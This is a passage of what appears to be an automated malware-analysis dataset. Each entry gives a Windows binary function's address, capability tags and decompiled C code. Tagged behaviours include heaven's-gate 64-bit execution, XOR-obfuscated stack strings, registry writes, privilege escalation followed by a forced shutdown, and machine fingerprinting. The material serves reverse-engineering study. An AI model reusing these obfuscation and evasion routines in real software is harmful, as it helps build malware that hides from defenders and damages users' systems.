(*_sym.imp.SHLWAPI.dll_StrStrA)(0x41cdf0, iVar8);\n    iVar9 = var_54h;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar10 != 0) {\n        fcn.0040b2bf();\n    }\n    uVar5 = (*pcVar2)(0, iVar8);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar9);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_5ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar7);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_64h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_44h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_10h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_88h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_8ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_90h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_94h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_98h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_9ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_a0h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_48h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar6);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_6ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_74h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_7ch);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar13);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, var_84h);\n    (*pcVar1)(uVar5);\n    uVar5 = (*pcVar2)(0, iVar4);\n    uVar12 = (*pcVar1)(uVar5);\n    return uVar12 & 0xffffff00;\n}\n",
        "token_count": 10039
    },
    "0040fe20": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040fe20(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint arg_10h)\n\n{\n    code **extraout_ECX;\n    uint32_t uVar1;\n    \n    fcn.0040fe75(0x33);\n    uVar1 = extraout_ECX[2] + 1 & 0xfe;\n    do {\n        uVar1 = uVar1 - 1;\n    } while (uVar1 != 0);\n    (**extraout_ECX)();\n    return;\n}\n",
        "token_count": 185
    },
    "00401033": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "query environment variable",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00401033(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint lpDst;\n    uint lpszShortPath;\n    uint ARG_0;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    uint *var_84h;\n    uint *var_80h;\n    uint var_78h;\n    uint hObject;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t lpLibFileName;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpszLongPath;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    lpszLongPath = *0x41cb38;\n    var_40h = 0x342f676c;\n    puVar8 = &lpDst;\n    for (iVar6 = 0x410; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_3ch = 0x6727653d;\n    var_38h = 0x653d343c;\n    puVar8 = &ARG_0;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_34h = 0x347d673b;\n    var_30h = 0x673a6508;\n    puVar8 = &ARG_0;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_2ch = 0x65273421;\n    var_28h = 0x343d673d;\n    puVar8 = &lpszShortPath;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_24h = 0x677a6539;\n    var_20h = 0x6508346a;\n    var_1ch._0_1_ = 0x2a;\n    var_1ch._1_1_ = 0x67;\n    var_1ch._2_1_ = 0x35;\n    var_1ch._3_1_ = 0x34;\n    var_18h._0_1_ = 0x30;\n    var_18h._1_2_ = 0x6765;\n    var_18h._3_1_ = 0x67;\n    var_14h._0_1_ = 0x3d;\n    var_14h._1_2_ = 0x2c34;\n    var_14h._3_1_ = 0x65;\n    var_10h._0_1_ = 0x2c;\n    var_10h._1_1_ = 0x67;\n    var_10h._2_1_ = 0x58;\n    var_10h._3_1_ = 0x34;\n    var_8h = 0x34586749;\n    var_4h._0_2_ = 0x6554;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x69);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    var_50h = 6;\n    iVar7 = 0;\n    lpLibFileName = &var_40h - iVar6;\n    var_54h = iVar6;\n    do {\n        iVar3 = (*pcVar5)();\n        if (iVar3 != 0xbb2a30) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_50h) ^ (iVar7 + iVar6)[lpLibFileName];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x34);\n    (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, &lpDst, 0x104);\n    (*_sym.imp.KERNEL32.dll_GetShortPathNameW)(lpszLongPath, &lpszShortPath, 0x104);\n    var_2ch = 0x7219637a;\n    var_28h = 0x36435a28;\n    var_24h = 0x63294b50;\n    var_20h = 0x5a2a7242;\n    var_1ch._0_1_ = 0x11;\n    var_1ch._1_1_ = 0x36;\n    var_1ch._2_1_ = 6;\n    var_1ch._3_1_ = 0x4b;\n    var_18h._0_1_ = 0x7a;\n    var_18h._1_2_ = 0x1363;\n    var_18h._3_1_ = 0x72;\n    var_14h._0_1_ = 0x38;\n    var_14h._1_2_ = 0x415a;\n    var_14h._3_1_ = 0x36;\n    var_10h._0_1_ = 0x72;\n    var_10h._1_1_ = 0x4b;\n    var_4ch = 0x7236635a;\n    var_48h._0_1_ = 0x4b;\n    uVar2 = (*pcVar5)(8, 0x3d);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    lpLibFileName = 5;\n    iVar7 = 0;\n    var_58h = iVar6;\n    lpszLongPath = &var_2ch - iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar3 != 0x118853) {\n            *(iVar7 + iVar6) = *(&var_4ch + iVar7 % lpLibFileName) ^ (iVar7 + iVar6)[&var_2ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar6, &lpszShortPath);\n    var_18h._0_1_ = 0x42;\n    var_18h._1_2_ = 0x2f77;\n    var_18h._3_1_ = 0x4f;\n    var_14h._0_1_ = 0x5f;\n    var_14h._1_2_ = 0x1630;\n    var_14h._3_1_ = 0x5a;\n    var_10h._0_1_ = 0x3c;\n    var_10h._1_1_ = 0x31;\n    var_10h._2_1_ = 0x30;\n    var_10h._3_1_ = 0x77;\n    var_8h = 0x4f5a7730;\n    puVar8 = &var_94h;\n    for (iVar6 = 0x3c; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x31);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    var_88h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar6 = 0;\n    var_4ch = var_88h;\n    lpszLongPath = &var_18h - var_88h;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar7 != 0xfc7f0f) {\n            *(iVar6 + var_88h) = *(&var_8h + iVar6 % lpLibFileName) ^ (iVar6 + var_88h)[&var_18h - var_88h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    var_84h = &lpDst;\n    var_94h = 0x3c;\n    var_80h = &ARG_0;\n    var_78h = 3;\n    var_90h = 0x40;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    var_18h._0_1_ = 0x31;\n    var_18h._1_2_ = 0x7c0f;\n    var_18h._3_1_ = 0x20;\n    var_14h._0_1_ = 0x3b;\n    var_14h._1_2_ = 0x5058;\n    var_14h._3_1_ = 0x69;\n    var_10h._0_1_ = 0x5d;\n    var_10h._1_1_ = 0;\n    var_10h._2_1_ = 0x1b;\n    var_10h._3_1_ = 0x6b;\n    var_8h = 0x6c394762;\n    var_4h._0_2_ = 0x6b77;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    lpLibFileName = iVar6;\n    lpszLongPath = &var_18h - iVar6;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n        if (iVar3 != 0xe218c4) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_50h) ^ (iVar7 + iVar6)[&var_18h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xc);\n    var_1ch._0_1_ = 5;\n    var_1ch._1_1_ = 0x1f;\n    var_1ch._2_1_ = 0x5d;\n    var_1ch._3_1_ = 0x54;\n    var_18h._0_1_ = 0xe;\n    var_18h._1_2_ = 0x2e1c;\n    var_18h._3_1_ = 0x12;\n    var_14h._0_1_ = 0x5b;\n    var_14h._1_2_ = 0x164d;\n    var_14h._3_1_ = 0x3c;\n    var_10h._0_1_ = 0x13;\n    var_10h._1_1_ = 0xf;\n    var_10h._2_1_ = 0x6f;\n    var_10h._3_1_ = 0x38;\n    var_8h = 0x38387756;\n    var_4h._0_2_ = 0x5962;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar7 = 0;\n    lpszLongPath = &var_1ch - iVar6;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        iVar3 = lpLibFileName;\n        if (iVar4 != 0x70c676) {\n            *(iVar7 + iVar6) = *(&var_8h + iVar7 % var_50h) ^ (iVar7 + iVar6)[&var_1ch - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x10);\n    uVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n    while( true ) {\n        var_8ch = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar7 = (*pcVar5)(&var_94h);\n        if (iVar7 != 0) break;\n        iVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar7 != 0x4c7) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*pcVar1)(0, iVar3);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_4ch);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_58h);\n    (*pcVar5)(uVar2);\n    uVar2 = (*pcVar1)(0, var_54h);\n    (*pcVar5)(uVar2);\n    return 1;\n}\n",
        "token_count": 3358
    },
    "00401fd8": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "query environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00401fd8(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint lpString;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0xe58300b;\n    var_14h = 0x2d0d3f25;\n    var_10h = 0x3d220255;\n    var_ch._0_1_ = 0x68;\n    puVar5 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    var_20h = 0;\n    var_8h = 0x6d394268;\n    var_4h._0_2_ = 0x524e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar2 != 0x589259) {\n            var_1ch = 6;\n            *(iVar6 + iVar4) = *(&var_8h + iVar6 % 6) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xd);\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(iVar4, &lpString, 0x104);\n    uVar1 = var_20h;\n    if (iVar6 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        iVar6 = fcn.00401000();\n        if (iVar6 == -0x69b4c9f2) {\n            uVar1 = 1;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 583
    },
    "00403149": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00403149(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t hKey;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_14h = *0x412430;\n    var_48h = 0x79024e1f;\n    var_44h = 0x4e383930;\n    var_40h = 0x3937791a;\n    var_3ch = 0x79084e3e;\n    var_38h = 0x4e01390a;\n    var_34h = 0x39357904;\n    var_30h = 0x79024e3e;\n    var_2ch = 0x4e233925;\n    var_28h = 0x3922790b;\n    var_24h._0_2_ = 0x4e4c;\n    var_20h = 0x796d4e4c;\n    var_1ch._0_2_ = 0x3956;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x4d);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar5 = 0;\n    var_18h = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar3 != 0x1effec) {\n            var_ch = 6;\n            *(iVar5 + iVar2) = *(&var_20h + iVar5 % 6) ^ (iVar5 + iVar2)[&var_48h - iVar2];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x26);\n    iVar5 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(hKey, iVar2, 0, 0xf003f, &var_4h);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        var_40h = 0x3732442d;\n        var_3ch = 0x46286e17;\n        var_38h = 0x4401657b;\n        var_34h = 0x6e283721;\n        var_30h = 0x654f4625;\n        var_2ch = 0x372f443d;\n        var_28h = 0x46216e1f;\n        var_24h._0_2_ = 0x6537;\n        var_ch = 0x3746446e;\n        var_8h._0_1_ = 0x65;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar5 = 0;\n        hKey = &var_40h - iVar2;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_CloseClipboard)();\n            if (iVar3 != 0x7f488f) {\n                hKey = 5;\n                *(iVar5 + iVar2) = *(&var_ch + iVar5 % 5) ^ (iVar5 + iVar2)[&var_40h - iVar2];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x1e);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(var_4h, iVar2, 0, 4, &var_14h, 4);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n        pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        iVar2 = var_18h;\n    }\n    uVar1 = (*pcVar4)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 1083
    },
    "00404d12": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "shutdown system",
            "modify access privileges"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404d12(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint NewState;\n    uint lpLuid;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint TokenHandle;\n    int32_t var_8h;\n    \n    var_38h = 0x3c3b0316;\n    var_34h = 0x9213b45;\n    var_30h = 0x3d603a1f;\n    var_2ch = 0x3801102c;\n    var_28h = 0x66202855;\n    var_14h = 0x54686645;\n    var_10h._0_2_ = 0x4f30;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_8h = 6;\n    iVar6 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar5 != 0x58f540) {\n            *(iVar6 + iVar4) = *(&var_14h + iVar6 % var_8h) ^ (iVar6 + iVar4)[&var_38h - iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x14);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, iVar4, &lpLuid);\n    NewState = 1;\n    var_18h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0, 0, 0);\n    pcVar2 = _sym.imp.USER32.dll_ExitWindowsEx;\n    iVar6 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        (*pcVar2)(4, 0);\n    }\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return;\n}\n",
        "token_count": 640
    },
    "00405b5b": {
        "rules": [
            "contain obfuscated stackstrings",
            "create or open registry key",
            "contain loop",
            "query or enumerate registry value",
            "set registry value",
            "get hostname"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405b5b(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uchar *puVar9;\n    uint32_t uVar10;\n    char cVar11;\n    uint name;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint var_5ch;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint lpValueName;\n    uint var_18h;\n    uchar *var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint nSize;\n    uint hKey;\n    \n    uStack100 = *0x41098c;\n    uStack104 = *0x410988;\n    uStack108 = *0x410984;\n    name = *0x410980;\n    var_4ch = 0x6e657272;\n    puVar9 = 0x41cb58;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    var_48h = 0x72655674;\n    var_44h = 0x6e6f6973;\n    var_40h._0_1_ = 0;\n    var_5ch = *0x410990;\n    uStack92 = *0x410994;\n    uStack88 = *0x410998;\n    uStack84 = *0x41099c;\n    var_3ch = *0x410970;\n    uStack60 = *0x410974;\n    uStack56 = *0x410978;\n    uStack52 = *0x41097c;\n    var_2ch._0_1_ = 0;\n    var_28h = 0x74736e49;\n    var_24h = 0x446c6c61;\n    var_20h = 0x657461;\n    lpValueName = 0x49676552;\n    var_18h._0_2_ = 100;\n    nSize = 0;\n    var_10h = 0;\n    hKey = 0;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x20119, &hKey);\n    if (iVar6 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 200);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar9 = puVar4;\n        for (iVar6 = 100; pcVar1 = _sym.imp.ADVAPI32.dll_RegQueryValueExA,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0x30;\n            puVar9 = puVar9 + 1;\n        }\n        nSize = 200;\n        var_14h = puVar4;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, &var_3ch, 0, 0, puVar4, &nSize);\n        nSize = 4;\n        cVar11 = iVar6 != 0;\n        iVar6 = (*pcVar1)(hKey, &var_28h, 0, 0, &var_10h, &nSize);\n        pcVar2 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar6 != 0) {\n            cVar11 = cVar11 + '\\x01';\n        }\n        if (cVar11 != '\\0') {\n            nSize = 4;\n            var_ch = 0;\n            iVar6 = (*pcVar1)(hKey, &lpValueName, 0, 0, &var_ch, &nSize);\n            uVar5 = var_ch;\n            if (iVar6 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*pcVar2)(hKey);\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(reloc.WS2_32.dll_bind, &name, 0, 0x4001f, &hKey);\n                if ((iVar6 != 0) ||\n                   (iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, &lpValueName, 0, 4, &var_ch, 4), \n                   uVar5 = var_ch,  iVar6 != 0)) {\n                    uVar5 = 0;\n                }\n            }\n            var_10h = var_10h ^ uVar5;\n        }\n        (*pcVar2)(hKey);\n        pcVar1 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar4 + 8);\n        uVar8 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (puVar4 + 8)[uVar7];\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar8 = uVar8 ^ var_10h;\n        nSize = 0x10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(iVar6, &nSize);\n        uVar5 = (*pcVar1)(iVar6);\n        uVar10 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar10 = (uVar10 >> 0xd | uVar10 << 0x13) + *(uVar7 + iVar6);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*pcVar1)(uVar3);\n        *0x41cb60 = uVar10 ^ uVar8;\n        *0x41cb64 = uVar10 << 10 | uVar10 >> 0x16;\n        *0x41cb58 = uVar8;\n        *0x41cb5c = uVar10;\n    }\n    return;\n}\n",
        "token_count": 1695
    },
    "00406317": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00406317(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint hObject;\n    int32_t StringSid;\n    uint dwBytes;\n    \n    iVar6 = 0;\n    dwBytes = 0;\n    hObject = 0;\n    StringSid = 0;\n    var_14h = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &hObject);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar3 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(hObject, 1, 0, dwBytes, &dwBytes);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 == 0x7a) {\n            puVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, dwBytes);\n            var_18h = puVar4;\n            if (puVar4 != NULL) {\n                iVar3 = (*pcVar1)(hObject, 1, puVar4, dwBytes, &dwBytes);\n                if (iVar3 != 0) {\n                    iVar3 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*puVar4, &StringSid);\n                    if ((iVar3 != 0) && (StringSid != 0)) {\n                        var_34h = 0x4a155225;\n                        var_30h = 0x525b6666;\n                        var_2ch = 0x667a4a0d;\n                        var_28h = 0x4a005247;\n                        var_24h._0_2_ = 0x6657;\n                        var_20h = 0x4a385276;\n                        var_1ch._0_2_ = 0x6657;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        do {\n                            iVar5 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                            if (iVar5 != 0x789144) {\n                                var_10h = 6;\n                                *(iVar6 + iVar3) = *(&var_20h + iVar6 % 6) ^ (iVar6 + iVar3)[&var_34h - iVar3];\n                            }\n                            iVar6 = iVar6 + 1;\n                        } while (iVar6 < 0x12);\n                        iVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(iVar3, StringSid);\n                        iVar6 = var_14h;\n                        if (iVar5 == 0) {\n                            iVar6 = 1;\n                        }\n                        (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                        puVar4 = var_18h;\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar4);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return iVar6;\n}\n",
        "token_count": 877
    },
    "00407172": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "set registry value",
            "get disk information"
